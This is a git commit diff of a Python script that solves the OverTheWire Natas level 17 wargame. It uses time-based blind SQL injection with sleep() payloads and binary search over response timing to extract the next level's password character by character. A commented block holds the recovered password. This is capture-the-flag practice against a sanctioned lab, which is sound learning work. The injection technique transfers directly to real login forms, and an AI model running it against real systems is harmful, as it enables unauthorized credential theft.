2a3d0aa128a85cb7f61e5ceebfd5a4b982782b26
dotiendat97 <38005847+dotiendat97@users.noreply.github.com>
2018-09-04 11:30:56 +0700

    Update natas17.py

--- natas17.py
+++ natas17.py
@@ -14,29 +14,37 @@ for i in range(1,33):
 		t = time.time()
 		r = requests.post("http://natas17.natas.labs.overthewire.org/index.php", headers = {"Authorization":auth}, data = Data)
 		t = time.time() - t
-		if t >= 1:
-			Data = {'username':'natas18"+-+if(ascii(substring(password,'+ str(i) +',1))='+str(mid)+',sleep(1),sleep(0))-- -'}
+		if t > 1:
 			t = time.time()
 			r = requests.post("http://natas17.natas.labs.overthewire.org/index.php", headers = {"Authorization":auth}, data = Data)
 			t = time.time() - t
-			if t >= 1:
+			if t > 1:
 				passwd += chr(mid)
 				print "Password: " + passwd
 				break
-		Data = {'username':'natas18"+-+if(ascii(substring(password,'+ str(i) +',1))>'+str(mid)+',sleep(1),sleep(0))-- -'}
+		Data = {'username':'natas18"+-+if(ascii(substring(password,'+ str(i) +',1))>'+str(mid)+',sleep(1),sleep(0))	-- -'}
 		t = time.time()
 		r = requests.post("http://natas17.natas.labs.overthewire.org/index.php", headers = {"Authorization":auth}, data = Data)
 		t = time.time() - t
-		if t >= 1:
-			Data = {'username':'natas18"+-+if(ascii(substring(password,'+ str(i) +',1))>'+str(mid)+',sleep(1),sleep(0))-- -'}
+		if t > 1:
 			t = time.time()
 			r = requests.post("http://natas17.natas.labs.overthewire.org/index.php", headers = {"Authorization":auth}, data = Data)
 			t = time.time() - t
-			if t >= 1:
+			if t > 1:
 				st = mid + 1
-		else:
-			en = mid - 1
-		if mid < 48:
-			print "Not found"
-			break
+			else:
+				en = mid - 1
+		
 				
+#check password
+# passwd = "xvjsqNnyvewUcwwgiklrjhpxUZsmxhdd"
+# for m in range(1, 33):		
+	# c = ord(passwd[m-1])
+	# Data = {'username':'natas18"+-+if(ascii(substring(password,'+ str(m) +',1))='+str(c)+',sleep(1),sleep(0))-- -'}
+	# t = time.time()
+	# r = requests.post("http://natas17.natas.labs.overthewire.org/index.php", headers = {"Authorization":auth}, data = Data)
+	# t = time.time() - t
+	# if t > 1:
+		# print str(m) + " Ok"
+	# else:
+		# print str(m) + " Fail"
